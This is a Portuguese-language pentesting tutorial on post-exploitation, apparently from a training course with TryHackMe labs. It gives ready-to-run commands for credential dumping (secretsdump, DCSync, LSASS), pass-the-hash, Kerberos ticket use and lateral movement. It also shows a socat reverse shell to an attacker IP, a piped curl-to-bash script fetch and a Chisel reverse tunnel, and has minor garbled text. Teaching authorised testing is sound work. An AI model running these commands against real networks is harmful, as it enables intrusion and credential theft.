# 🔧 Pós-Exploração

> Ferramentas para manter acesso e explorar sistemas após exploração inicial.

## 📚 O que é Pós-Exploração?

**Pós-exploração** é tudo que você faz **depois de ganhar acesso inicial**. É como entrar na casa — agora você precisa explorar os cômodos, encontrar o cofre, pegar as chaves de outras casas.

### Por que isso é importante?

- Acesso inicial pode ser **limitado** (usuário normal)
- Precisa **escalar para admin/root** para controle total
- Pode haver **outras máquinas** na rede (movimentação lateral)
- Objetivo final: **alcançar o alvo real** (que pode estar em outro lugar)

### O que você faz na pós-exploração?

```
Acesso inicial (reverse shell)
        ↓
1. Enumerar → O que tem nessa máquina?
        ↓
2. Escalar → Ganhar root/admin
        ↓
3. Movimentar → Acessar outras máquinas
        ↓
4. Persistir → Manter acesso mesmo se bloqueado
        ↓
5. Exfiltrar → Levar os dados (se for o objetivo)
```

### Ferramentas por sistema operacional

| Linux | Windows | Para que serve |
|:---|:---|:---|
| LinPEAS | WinPEAS | Enumeração automatizada |
| smbclient.py | psexec.py | Acesso via SMB |
| secretsdump.py | mimikatz | Dump de credenciais |
| socat | nc | Reverse shell |

### Conceitos importantes

| Conceito | Significado |
|:---|:---|
| **Escalation** | Ganhar mais privilégios (user → root) |
| **Lateral Movement** | Acessar outras máquinas na rede |
| **Pivoting** | Usar máquina comprometida como ponte |
| **Persistence** | Manter acesso após reiniciar |
| **Exfiltration** | Enviar dados para fora da rede |

---

## 🚀 Passo a Passo — Como fazer Pós-Exploração

Você já conseguiu acesso a uma máquina (ex: via reverse shell). Agora vamos **explorar mais** e pegar credenciais.

### Passo 1: Enumeração básica (smbclient.py)
```bash
# Primeiro, veja quais shares (pastas compartilhadas) a máquina tem
smbclient.py usuario:senha@192.168.1.1

# Se não tiver senha, tente anônimo:
smbclient.py usuario:senha@192.168.1.1 -shares
```

### Passo 2: Executar comandos (wmiexec.py)
```bash
# Execute comandos na máquina remota (mais stealth que psexec)
wmiexec.py usuario:senha@192.168.1.1

# Isso te dá um shell interativo — teste:
whoami
hostname
ipconfig
```

### Passo 3: Pegar hashes de senhas (secretsdump.py)
```bash
# Isso pega todos os hashes de senhas da máquina
secretsdump.py usuario:senha@192.168.1.1

# O output mostra hashes como:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:da76f...
# Salve esses hashes!
```

### Passo 4: Usar os hashes encontrados (Pass-the-Hash)
```bash
# Agora você pode usar os hashes para acessar OUTRAS máquinas
psexec.py outro_usuario@outra_maquina -hashes aad3b435b51404eeaad3b435b51404ee:da76f...

# Ou via WMI (mais stealth):
wmiexec.py outro_usuario@outra_maquina -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
```

### Passo 5: Transferir arquivos (smbserver.py)
```bash
# Crie um share SMB temporário para enviar/receber arquivos
smbserver.py share /tmp/pasta_compartilhada -smb2

# Na máquina alvo, acesse:
# \\192.168.1.1\share\arquivo.exe
```

### Resumo da ordem — Por que essa sequência?

Pós-exploração segue: **manter acesso → enumerar → movimentar**.

```
PASSO 1: Estabilizar shell → Garantir acesso persistente
├── POR QUE: Shells interrompidas são comuns, precisa de algo mais estável
├── O QUE FAZER: Usar socat para shell com SSL, ou meterpreter
├── COMANDO: socat OPENSSL:IP:4444,verify=0 EXEC:/bin/bash
├── QUANDO AVANÇAR: Quando tiver shell estável
└── DICAS: Teste com Ctrl+C se a shell trava

        ↓

PASSO 2: Enumerar sistema → Descobrir o que tem na máquina
├── POR QUE: Precisa saber: versão do SO, usuários, serviços, configurações
├── O QUE PROCURAR: Versão do kernel (vulnerável?), usuários com sudo, arquivos sensíveis
├── COMANDO: LinPEAS no Linux, WinPEAS no Windows
├── QUANDO AVANÇAR: Quando tiver mapa completo do sistema
└── ERROS COMUNS: Não pule a enumeração — ela revela caminhos de escalação

        ↓

PASSO 3: Escalação de privilégios → Ganhar root/admin
├── POR QUE: Root = acesso total ao sistema
├── O QUE PROCURAR: SUID binaries, kernels vulneráveis, sudo sem senha
├── FERRAMENTAS: LinPEAS, GTFOBins, linux-exploit-suggester
├── QUANDO AVANÇAR: Quando tiver root
└── SE DER ERRADO: Se não achar caminho, verifique /etc/crontab, /opt/, backups

        ↓

PASSO 4: Enumerar rede → Descobrir outras máquinas
├── POR QUE: Uma máquina comprometida pode dar acesso a outras
├── O QUE PROCURAR: Outros IPs na rede, serviços internos, trust relationships
├── COMANDO: ip a, arp -a, nmap -sn 10.0.0.0/24
├── QUANDO AVANÇAR: Quando souber quais máquinas existem na rede
└── DICAS: Verifique /etc/hosts, /etc/resolv.conf, rotas

        ↓

PASSO 5: Movimentação lateral → Acessar outras máquinas
├── POR QUE: O alvo final pode estar em outra máquina
├── O QUE FAZER: Usar credenciais encontradas, pivoting, pass-the-hash
├── FERRAMENTAS: Impacket (smbexec, wmiexec), Evil-WinRM
├── QUANDO PARAR: Quando alcançar o alvo final
└── ÉTICA: Documente cada passo para o relatório
```

---

## Impacket

Toolkit Python para protocolos de rede Windows/SMB/NetBIOS. Poderoso para movimentação lateral.

### 🎯 Quando usar o Impacket
- Você comprometeu uma máquina Windows e precisa executar comandos remotamente (SMB, WMI, agendamento de tarefas)
- Precisa fazer dump de credenciais (SAM, LSASS, DCSync) em hosts do domínio
- Precisa se movimentar lateralmente usando Pass-the-Hash ou tickets Kerberos
- Precisa transferir arquivos entre máquinas via share SMB temporário

### 🛠️ Como o Impacket te ajuda
- Substitui ferramentas do Windows (PsExec, WMI) com versões Python que funcionam no Kali
- Permite usar hashes roubados sem conhecer a senha (Pass-the-Hash)
- Oferece múltiplos métodos de execução — escolha o mais stealth para cada situação
- Facilita coleta de credenciais com `secretsdump.py` em um único comando

### ➡️ Depois de usar o Impacket — Próximos passos
1. Salve os hashes coletados com `secretsdump.py` em um arquivo seguro
2. Teste os hashes em outros hosts da rede com `psexec.py` ou `wmiexec.py`
3. Documente cada acesso obtido para o relatório final
4. Se encontrou DCSync, analise os dados no BloodHound para mapear novos caminhos de ataque

### Instalação
```bash
sudo apt install -y python3-impacket
```

### Ferramentas mais usadas

| Ferramenta | Descrição |
|:---|:---|
| `psexec.py` | Executar comandos via SMB (como PsExec do Sysinternals) |
| `wmiexec.py` | Executar comandos via WMI |
| `smbexec.py` | Executar comandos via SMB (sem upload de binary) |
| `atexec.py` | Executar comandos via Agenda de Tarefas |
| `secretsdump.py` | Dump de credenciais (SAM, LSASS, DCSync) |
| `smbclient.py` | Cliente SMB interativo |
| `smbserver.py` | Servidor SMB (para transferir arquivos) |
| `getTGT.py` | Obter TGT Kerberos |
| `getST.py` | Obter Service Ticket |
| `ticketConverter.py` | Converter tickets Kerberos |
| `mimidump.py` | Dump de memória do Mimikatz |

### Exemplos práticos

```bash
# === ACESSO SMB ===

# Listar shares
smbclient.py domain/user:password@192.168.1.1

# Listar shares anônimo
smbclient.py domain/user:password@192.168.1.1 -shares

# Conectar a share específica
smbclient.py domain/user:password@192.168.1.1 -share "C$"

# === EXECUÇÃO DE COMANDOS ===

# Via SMB (precisa de admin)
psexec.py domain/user:password@192.168.1.1

# Via WMI (mais stealth)
wmiexec.py domain/user:password@192.168.1.1

# Via SMB sem upload
smbexec.py domain/user:password@192.168.1.1

# Via agenda de tarefas
atexec.py domain/user:password@192.168.1.1 "whoami"

# === PASS-THE-HASH ===

# Usar hash NTLM no lugar de senha
psexec.py domain/user@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
wmiexec.py domain/user@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:da76f...

# === DUMP DE CREDENCIAIS ===

# Dump SAM ( hashes locais)
secretsdump.py domain/user:password@192.168.1.1

# Dump SAM via hash
secretsdump.py domain/user@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:da76f...

# DCSync (replicar AD)
secretsdump.py domain/user:password@192.168.1.1 -just-dc-ntlm

# Dump LSASS remoto
secretsdump.py domain/user:password@192.168.1.1 -lsass

# === KERBEROS ===

# Obter TGT com hash
getTGT.py domain/user -hashes aad3b435b51404eeaad3b435b51404ee:da76f...

# Obter TGT com senha
getTGT.py domain/user:password

# Obter Service Ticket (Kerberoasting)
getST.py -spn cifs/target.domain.local domain/user -hashes ...

# Converter ticket
ticketConverter.py ticket.kirbi ticket.ccache

# Usar ticket (Kerberos authentication)
export KRB5CCNAME=ticket.ccache
psexec.py domain/user@target.domain.local -k -no-pass

# === TRANSFERÊNCIA DE ARQUIVOS ===

# Criar share SMB temporário
smbserver.py share /tmp/share -smb2

# Na máquina alvo, conectar:
copy \\192.168.1.1\share\arquivo.exe C:\temp\

# OU em Linux:
smbclient.py domain/user:password@192.168.1.1 -share share -use-smb2
```

### Autenticação Kerberos

```bash
# Configurar Kerberos (no /etc/krb5.conf)
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

# Usar ticket com Impacket
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py target.domain.local -k -no-pass
```

---

## Enum4linux-ng

Enumeração SMB/Windows moderna. Descobre shares, usuários, polices, etc.

### 🎯 Quando usar o Enum4linux-ng
- Precisa descobrir shares SMB, usuários do domínio e políticas de senha em uma máquina Windows
- Quer uma enumeração rápida e automatizada sem interação manual
- Precisa de output em JSON para integrar com outras ferramentas ou scripts
- Está atacando um host SMB e precisa de um inventário completo antes de explorar

### 🛠️ Como o Enum4linux-ng te ajuda
- Roda uma única flag (`-A`) e retorna tudo: shares, usuários, grupos, políticas, versão do SO
- Gera saída em JSON para processamento posterior ou ingestão em ferramentas como BloodHound
- É mais rápido que o smbclient.py para enumeração inicial — economiza tempo em engajamento
- Detecta configurações inseguras (SMBv1, signing desabilitado) que podem ser exploradas

### ➡️ Depois de usar o Enum4linux-ng — Próximos passos
1. Analise os shares encontrados — tente acessar com credenciais coletadas ou anônimo
2. Revise as políticas de senha para identificar regras fracas (senhas curtas, sem complexidade)
3. Use a lista de usuários para ataques de brute-force com Hydra ou Cracker
4. Importe os dados em BloodHound para visualizar relaciones e caminhos de ataque

### Instalação
```bash
sudo git clone --depth=1 https://github.com/cddmp/enum4linux-ng.git /opt/enum4linux-ng
cd /opt/enum4linux-ng && sudo pip3 install -r requirements.txt
sudo ln -sf /opt/enum4linux-ng/enum4linux-ng.py /usr/local/bin/enum4linux-ng
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-U` | Listar usuários |
| `-S` | Listar shares |
| `-P` | Listar polices (password policy) |
| `-G` | Listar grupos |
| `-M` | Enumerar MAC |
| `-o` | Output JSON |
| `-A` | Enumeração completa |

### Exemplos práticos

```bash
# Enumeração completa
enum4linux-ng -A 192.168.1.1

# Listar shares
enum4linux-ng -S 192.168.1.1

# Listar usuários
enum4linux-ng -U 192.168.1.1

# Com autenticação
enum4linux-ng -u admin -p senha -A 192.168.1.1

# Output JSON
enum4linux-ng -A -o output.json 192.168.1.1

# Listar polices de senha
enum4linux-ng -P 192.168.1.1
```

### O que o enum4linux-ng descobre
- Shares SMB disponíveis
- Usuários do domínio
- Grupos e membros
- Polices de senha
- Informações do domínio
- Versão do SO
- Horário do sistema
- SMTP relay

### enum4linux-ng vs smbclient.py

| Feature | enum4linux-ng | smbclient.py |
|:---|:---|:---|
| Enumeração | ✅ Completa | Limitada |
| Interativo | ❌ | ✅ |
| Dump de dados | ❌ | ✅ |
| Speed | Rápido | Mais lento |
| Output | JSON | Terminal |

---

## Tool Card: BloodHound CE

**O que é:** Ferramenta de análise de Active Directory que mapeia caminhos de ataque (attack paths) de usuários não-privilegiados até Domain Admin.

### 🎯 Quando usar o BloodHound CE
- Você tem credenciais de um domínio Active Directory e precisa encontrar o caminho mais curto até Domain Admin
- Precisa identificar usuários Kerberoastable, AS-REP roastable ou com direitos DCSync
- Quer visualizar graficamente as trust relationships e permissões do domínio
- Está planejando movimentação lateral e precisa saber quais hosts cada usuário é admin

### 🛠️ Como o BloodHound CE te ajuda
- Mapeia automaticamente milhares de objetos AD (usuários, grupos, computadores, permissões)
- Encontra attack paths que seriam impossíveis de identificar manualmente
- Mostra quais usuários têm caminho direto ou indireto para Domain Admin
- Salva dados coletados para auditoria e planejamento futuro

### ➡️ Depois de usar o BloodHound CE — Próximos passos
1. Execute a query "Shortest Path to Domain Admin" e documente os caminhos encontrados
2. Identifique os usuários mais vulneráveis (Kerberoastable, AS-REP roastable) e priorize ataques
3. Use os dados para criar um relatório de risco para o cliente
4. Planeje a exploração de cada caminho encontrado antes de prosseguir

### Instalação (Docker)

```bash
# Instalar BloodHound CE via Docker
sudo docker pull docker.io/specterops/bloodhound:latest

# Criar diretório de dados
mkdir -p ~/.bloodhound

# Iniciar BloodHound
sudo docker run -d \
  --name bloodhound \
  -p 7474:7474 -p 7687:7687 \
  -v ~/.bloodhound:/data \
  --restart unless-stopped \
  docker.io/specterops/bloodhound:latest

# Verificar status
sudo docker ps | grep bloodhound
# OUTPUT ESPERADO:
# CONTAINER ID  IMAGE                          PORTS                    NAMES
# a1b2c3d4e5f6  specterops/bloodhound:latest   0.0.0.0:7474->7474/tcp   bloodhound
```

### Acessar interface web

```
Abra: http://localhost:7474
Login padrão: neo4j / neo4j
Crie nova senha após primeiro login
```

### Coletar dados com SharpHound (Windows)

```bash
# Na máquina Windows comprometida:
# Baixar SharpHound: https://github.com/BloodHoundAD/BloodHound/releases

# Coleta completa (método 1 - execução no alvo)
SharpHound.exe -c All --zip

# OUTPUT ESPERADO:
# 2026-09-10T10:00:00 [INFORMATION] Starting SharpHound...
# 2026-09-10T10:00:01 [INFORMATION] Initializing SharpHound...
# 2026-09-10T10:00:02 [INFORMATION] Beginning collection...
# 2026-09-10T10:05:15 [INFORMATION] Completed collection!
# 2026-09-10T10:05:15 [INFORMATION] Output written to: 20260910100515_BloodHound.zip

# Coleta remota (método 2 - do Kali)
bloodhound-python -c All -u 'usuario@dominio.local' -p 'senha' -d dominio.local -ns 10.0.0.1

# OUTPUT ESPERADO:
# INFO: BloodHound.py for BloodHound CE
# INFO: Found AD domain: dominio.local
# INFO: Connecting to LDAP server: dc01.dominio.local
# INFO: Found 152 users
# INFO: Found 45 groups
# INFO: Found 12 computers
# INFO: Found 8 domain controllers
# INFO: Done collecting properties (152/152)
```

### Analisar attack paths no BloodHound

```
Na interface web:
1. Clique em "Analysis" → "Path Finder"
2. Selecione "Start Node" → um usuário comum
3. Selecione "End Node" → Domain Admin
4. Clique em "Find Paths"

O que procurar:
- Shortest path to Domain Admin
- Kerberoastable users
- AS-REP roastable accounts
- Users with DCSync rights
- Computers where Domain Users are local admin
```

### O que procurar no BloodHound

| Query | O que significa |
|:------|:----------------|
| "Shortest Path to Domain Admin" | Caminho mais rápido para escalar |
| "Kerberoastable Users" | Usuários com SPN que podem ser Kerberoastados |
| "AS-REP Roastable" | Usuários sem pre-auth |
| "DCSync Rights" | Usuários que podem replicar AD |
| "Principals with DCSync" | Contas que têm permissão DCSync |

---

## Tool Card: evil-winrm

**O que é:** Shell remota via WinRM (Windows Remote Management) — alternativa ao psexec, mais stealth.

### 🎯 Quando usar o evil-winrm
- Precisa de uma shell estável em um host Windows sem gerar tantos logs quanto o psexec
- Quer fazer upload de scripts PowerShell diretamente para a máquina alvo antes de executar
- Tem hashes NTLM e precisa usar Pass-the-Hash em hosts que suportam WinRM
- O target não tem serviços SMB abertos mas tem WinRM (porta 5985/5986) habilitado

### 🛠️ Como o evil-winrm te ajuda
- Oferece uma shell PowerShell interativa mais estável que psexec e wmiexec
- Permite upload automático de scripts com a flag `-s` — não precisa transferir manualmente
- Suporta Pass-the-Hash diretamente, sem precisar converter ou usar ferramentas extras
- Gera menos tráfego de rede que psexec, reduzindo a chance de detecção por IDS/IPS

### ➡️ Depois de usar o evil-winrm — Próximos passos
1. Verifique o nível de privilégio com `whoami /priv` — identifique tokens impersonate disponíveis
2. Execute enumeração interna (WinPEAS, seatbelt) para encontrar vetores de escalação
3. Extraia credenciais com mimikatz ou secretsdump se tiver privilégios suficientes
4. Documente o acesso e mova para a próxima máquina do alvo

### Instalação

```bash
# Pré-instalado no Kali. Verificar:
evil-winrm --version
# Evil-WinRM shell v3.5
```

### Uso básico

```bash
# Conectar com credenciais
evil-winrm -i 192.168.1.1 -u administrator -p 'senha'

# OUTPUT ESPERADO:
# Evil-WinRM shell v3.5
#
# Info: Establishing connection to remote endpoint
# *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
# dominio\administrator
# *Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Flags principais

| Flag | O que faz |
|:-----|:----------|
| `-i IP` | IP ou hostname da máquina alvo |
| `-u usuário` | Nome de usuário |
| `-p senha` | Senha |
| `-H hash` | Hash NTLM (pass-the-hash) |
| `-s porta` | Porta WinRM (padrão: 5985) |
| `-e caminho` | Upload de script antes de conectar |

### Uso com scripts e pass-the-hash

```bash
# Upload de script
evil-winrm -i 192.168.1.1 -u administrator -p 'senha' -s /path/to/script.ps1

# Pass-the-hash
evil-winrm -i 192.168.1.1 -u administrator -H aad3b435b51404eeaad3b435b51404ee:da76f...

# OUTPUT ESPERADO (com script):
# Evil-WinRM shell v3.5
# Info: Establishing connection to remote endpoint
# Info: Preparing script for remote execution...
# *Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

## Tool Card: CrackMapExec

**O que é:** Ferramenta de enumeração e exploração de redes — testa credenciais em múltiplos hosts (SMB, WinRM, SSH, LDAP).

### 🎯 Quando usar o CrackMapExec
- Precisa testar uma credencial (senha ou hash) em vários hosts da rede ao mesmo tempo
- Quere descobrir quais máquinas um usuário tem acesso e se é admin (`Pwn3d!`)
- Precisa enumerar shares, sessões ou usuários do domínio via LDAP de forma rápida
- Está em uma auditoria de Active Directory e precisa mapear logons válidos em larga escala

### 🛠️ Como o CrackMapExec te ajuda
- Testa credenciais em centenas de hosts em paralelo — muito mais rápido que ferramentas individuais
- Indica claramente se você tem acesso admin (`Pwn3d!`) ou apenas logon válido
- Funciona com múltiplos protocolos (SMB, WinRM, SSH, LDAP, WMI) em uma única ferramenta
- Pode executar comandos diretamente nos hosts onde tem admin, sem abrir shell separada

### ➡️ Depois de usar o CrackMapExec — Próximos passos
1. Priorize os hosts marcados como `Pwn3d!` — esses são os que você pode explorar diretamente
2. Acesse os hosts administráveis com evil-winrm, psexec ou wmiexec
3. Extraia hashes com secretsdump nos hosts onde tem admin para movimentação lateral
4. Documente todos os logons válidos encontrados para o relatório de auditoria

### Instalação

```bash
# Pré-instalado no Kali. Verificar:
crackmapexec --version
# CrackMapExec v5.4.0
```

### Uso básico

```bash
# Testar credenciais em rede inteira
crackmapexec smb 10.0.0.0/24 -u administrator -p 'senha'

# OUTPUT ESPERADO:
# SMB         10.0.0.1      445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:dominio.local) (signing:True) (SMBv1:False)
# SMB         10.0.0.1      445    DC01           [+] dominio.local\administrator:senha
# SMB         10.0.0.2      445    WEB01          [*] Windows 10.0 Build 17763 x64 (name:WEB01) (domain:dominio.local) (signing:True) (SMBv1:False)
# SMB         10.0.0.2      445    WEB01          [+] dominio.local\administrator:senha
# SMB         10.0.0.3      445    FILE01         [-] dominio.local\administrator:senha (STATUS_LOGON_FAILURE)
```

### Uso com hash (pass-the-hash)

```bash
# Testar hash em múltiplos hosts
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:da76f...

# OUTPUT ESPERADO:
# SMB         10.0.0.1      445    DC01           [+] dominio.local\administrator:NTHASH (Pwn3d!)
# SMB         10.0.0.2      445    WEB01          [+] dominio.local\administrator:NTHASH (Pwn3d!)
```

**O que procurar:**
- `(Pwn3d!)` = tem acesso admin (pode executar comandos)
- `[+]` = credencial válida
- `[-]` = credencial inválida

### Enumeração via LDAP

```bash
# Listar usuários do domínio
crackmapexec ldap 10.0.0.1 -u administrator -p 'senha' --users

# ListarShares SMB
crackmapexec smb 10.0.0.1 -u administrator -p 'senha' --shares

# Listar sessões
crackmapexec smb 10.0.0.0/24 -u administrator -p 'senha' --sessions
```

---

## Outras ferramentas de pós-exploração

### Linpeas / Winpeas
```bash
# Enumeração de privilege escalation
# Linux:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Windows:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o winPEAS.bat
```

### Chisel (Proxy reverso via HTTP)
```bash
# Instalar
go install github.com/jpillora/chisel@latest

# Atacante (server):
chisel server --reverse -p 8080

# Vítima (client):
chisel client 192.168.1.1:8080 R:socks
```

### Ligolo-ng (Tunneling)
```bash
# Alternativa ao Chisel para pivoting
# https://github.com/nicocha30/ligolo-ng
```

---

## Fluxo típico de Pós-Exploração

```
1. Acesso inicial obtido
        ↓
2. Enumeração interna (smbclient.py, wmiexec.py)
        ↓
3. Dump de credenciais (secretsdump.py)
        ↓
4. Movimentação lateral (psexec.py com novas credenciais)
        ↓
5. Escalada de privilégios (DUMP de admin, Kerberos)
        ↓
6. Persistência (scheduled tasks, registry, etc)
        ↓
7. Exfiltração de dados
```

### Resumo de comandos mais usados

```bash
# Listar shares
smbclient.py user:pass@IP

# Executar comandos
wmiexec.py user:pass@IP "whoami"

# Dump de hashes
secretsdump.py user:pass@IP

# Pass-the-hash
psexec.py user@IP -hashes LMHASH:NTHASH

# Kerberos
export KRB5CCNAME=ticket.ccache
psexec.py user@TARGET -k -no-pass
```

---

## Lab Prático

### Exercício 1: Pós-Exploração Linux
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/linprivesc
- **O que vai praticar:** Enumeração, escalação de privilégios, movimentação lateral em Linux
- **Tempo estimado:** 45 min

### Exercício 2: Pós-Exploração Windows
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/ice
- **O que vai praticar:** Pivoting, dump de credenciais, exploração de rede interna
- **Tempo estimado:** 60 min

### Dica de Estudo
> Sempre枚umerar antes de tentar escalar privilégios. Use LinPEAS/WinPEAS para automatizar.
